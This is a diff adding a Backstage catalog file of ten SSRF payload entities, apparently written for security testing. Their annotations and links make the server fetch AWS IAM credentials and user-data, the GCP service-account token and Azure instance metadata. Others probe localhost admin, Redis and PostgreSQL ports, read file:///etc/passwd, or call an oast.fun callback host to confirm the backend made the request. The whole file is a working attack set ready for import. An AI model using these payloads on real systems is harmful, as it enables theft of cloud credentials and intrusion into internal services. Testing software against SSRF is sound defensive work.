@@ -1,0 +1,173 @@
+# Resources para SSRF Testing
+
+# Resource 1: AWS Metadata IAM
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-aws-iam
+  title: SSRF via Resource - AWS IAM
+  description: Testing SSRF through Resource type entity
+  annotations:
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    backstage.io/source-location: url:http://169.254.169.254/latest/user-data
+  tags:
+    - ssrf-test
+    - aws-metadata
+spec:
+  type: infrastructure
+  owner: group:default/security-team
+  system: ssrf-testing
+
+---
+# Resource 2: Interact.sh Backend Verification
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-interact
+  title: SSRF Resource - Interact.sh
+  description: Verify backend makes request on import
+  annotations:
+    backstage.io/techdocs-ref: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/resource-backend-test
+  tags:
+    - ssrf-test
+    - interact
+spec:
+  type: infrastructure
+  owner: group:default/security-team
+
+---
+# Resource 3: AWS Instance Identity
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-aws-identity
+  title: SSRF Resource - AWS Identity
+  description: Testing instance identity extraction
+  annotations:
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/dynamic/instance-identity/document
+  tags:
+    - aws-identity
+spec:
+  type: database
+  owner: group:default/security-team
+
+---
+# Resource 4: Localhost Internal Services
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-localhost
+  title: SSRF Resource - Localhost
+  description: Testing internal service access
+  annotations:
+    backstage.io/techdocs-ref: url:http://127.0.0.1:8080/admin
+  tags:
+    - localhost
+spec:
+  type: service
+  owner: group:default/security-team
+
+---
+# Resource 5: GCP Metadata
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-gcp
+  title: SSRF Resource - GCP Metadata
+  description: Testing GCP metadata access
+  annotations:
+    backstage.io/techdocs-ref: url:http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+  tags:
+    - gcp-metadata
+spec:
+  type: infrastructure
+  owner: group:default/security-team
+
+---
+# Resource 6: Azure Metadata
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-azure
+  title: SSRF Resource - Azure Metadata
+  description: Testing Azure metadata access
+  annotations:
+    backstage.io/techdocs-ref: url:http://169.254.169.254/metadata/instance?api-version=2021-02-01
+  tags:
+    - azure-metadata
+spec:
+  type: infrastructure
+  owner: group:default/security-team
+
+---
+# Resource 7: Port Scan Redis
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-redis
+  title: SSRF Resource - Redis Port
+  description: Testing Redis port accessibility
+  annotations:
+    backstage.io/techdocs-ref: url:http://127.0.0.1:6379/
+  tags:
+    - port-scan
+spec:
+  type: database
+  owner: group:default/security-team
+
+---
+# Resource 8: Port Scan PostgreSQL
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-postgres
+  title: SSRF Resource - PostgreSQL Port
+  description: Testing PostgreSQL port accessibility
+  annotations:
+    backstage.io/techdocs-ref: url:http://127.0.0.1:5432/
+  tags:
+    - port-scan
+spec:
+  type: database
+  owner: group:default/security-team
+
+---
+# Resource 9: Múltiples vectores
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-multi
+  title: SSRF Resource - Multi Vector
+  description: Multiple SSRF vectors in one resource
+  annotations:
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/meta-data/
+    backstage.io/source-location: url:http://169.254.169.254/latest/user-data
+    circleci.com/project-slug: dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/circleci-test
+  links:
+    - url: http://169.254.169.254/latest/meta-data/instance-id
+      title: Instance ID
+    - url: http://127.0.0.1:8080/metrics
+      title: Internal Metrics
+  tags:
+    - multi-vector
+spec:
+  type: infrastructure
+  owner: group:default/security-team
+  dependsOn:
+    - resource:default/ssrf-resource-interact
+
+---
+# Resource 10: File Protocol Test (si está permitido)
+apiVersion: backstage.io/v1alpha1
+kind: Resource
+metadata:
+  name: ssrf-resource-file
+  title: SSRF Resource - File Protocol
+  description: Testing file:// protocol access
+  annotations:
+    backstage.io/techdocs-ref: url:file:///etc/passwd
+  tags:
+    - file-protocol
+spec:
+  type: infrastructure
+  owner: group:default/security-team
